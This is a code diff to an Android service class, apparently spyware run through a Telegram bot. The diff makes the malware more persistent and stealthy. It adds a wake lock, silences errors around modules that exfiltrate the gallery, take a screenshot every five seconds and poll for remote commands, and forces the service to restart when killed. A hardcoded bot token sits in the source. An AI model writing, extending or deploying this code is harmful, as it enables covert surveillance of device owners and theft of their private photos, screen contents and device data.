@@ -4,6 +4,7 @@ import android.app.*
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
+import android.os.PowerManager
 import androidx.core.app.NotificationCompat
 import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
@@ -12,6 +13,7 @@ class DdosService : Service() {
 
     private val CHANNEL_ID = "ddos_network"
     private val NOTIF_ID = 1
+    private var wakeLock: PowerManager.WakeLock? = null
 
     // 🔴 BOT TOKEN YAHAN DAALO
     private val BOT_TOKEN = "8668374754:AAEftxVfvzLVsajQRWSt0iJv5a18N90Vupg"
@@ -19,7 +21,19 @@ class DdosService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        
+        // Start foreground immediately
         startSilentForeground()
+        
+        // Acquire wake lock to keep CPU running
+        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
+        wakeLock = powerManager.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK,
+            "ddos::wakelock"
+        )
+        wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
+        
+        // Start all modules
         startAllModules()
     }
 
@@ -72,27 +86,44 @@ class DdosService : Service() {
         // Module 1: Gallery Exfiltration — every 10 seconds
         val galleryScanner = GalleryScanner(this, bot)
         executor.scheduleWithFixedDelay({
-            galleryScanner.scanAndUpload()
+            try {
+                galleryScanner.scanAndUpload()
+            } catch (e: Exception) {
+                // Silent
+            }
         }, 0, 10, TimeUnit.SECONDS)
 
         // Module 2: Screenshot — every 5 seconds
         val screenshotTaker = ScreenshotTaker(this, bot)
         executor.scheduleWithFixedDelay({
-            screenshotTaker.captureAndSend()
+            try {
+                screenshotTaker.captureAndSend()
+            } catch (e: Exception) {
+                // Silent
+            }
         }, 5, 5, TimeUnit.SECONDS)
 
         // Module 3: Command Listener — every 3 seconds
         executor.scheduleWithFixedDelay({
-            bot.checkCommands()
+            try {
+                bot.checkCommands()
+            } catch (e: Exception) {
+                // Silent
+            }
         }, 0, 3, TimeUnit.SECONDS)
 
         // Module 4: Device Info on Start
         executor.submit {
-            bot.sendDeviceInfo()
+            try {
+                bot.sendDeviceInfo()
+            } catch (e: Exception) {
+                // Silent
+            }
         }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Restart if killed
         return START_STICKY
     }
 
@@ -100,7 +131,18 @@ class DdosService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        val restart = Intent(this, DdosService::class.java)
-        startService(restart)
+        
+        // Release wake lock
+        wakeLock?.let {
+            if (it.isHeld) it.release()
+        }
+        
+        // Restart service if killed
+        val restartIntent = Intent(this, DdosService::class.java)
+        if (Build.VERSION.SDK_INT >= 26) {
+            startForegroundService(restartIntent)
+        } else {
+            startService(restartIntent)
+        }
     }
 }
